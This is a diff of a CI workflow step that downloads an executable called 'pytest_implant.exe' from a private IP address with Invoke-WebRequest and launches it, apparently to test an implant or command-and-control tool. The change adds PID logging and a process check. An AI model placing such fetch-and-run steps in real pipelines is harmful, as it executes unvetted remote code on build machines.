@@ -51,8 +51,11 @@ jobs:
     - name: Get & Run Implant
       run: |
         # Pull implant
-        Invoke-WebRequest http://10.0.1.170:80/pytest_implant.exe -OutFile c:\pytest_implant.exe
+        Invoke-WebRequest http://10.0.1.170:80/pytest_implant.exe -OutFile C:\pytest_implant.exe
         # run implant
-        Start-Process "C:\pytest_implant.exe"
+        $proc = Start-Process -FilePath "C:\pytest_implant.exe" -PassThru
+        Write-Host "Started PID: $($proc.Id)"
+        Start-Sleep -Seconds 2
+        Get-Process -Id $proc.Id
 
 # implant testing job here, that runs again on the linux box, and runs api commands and checks them, via pytests
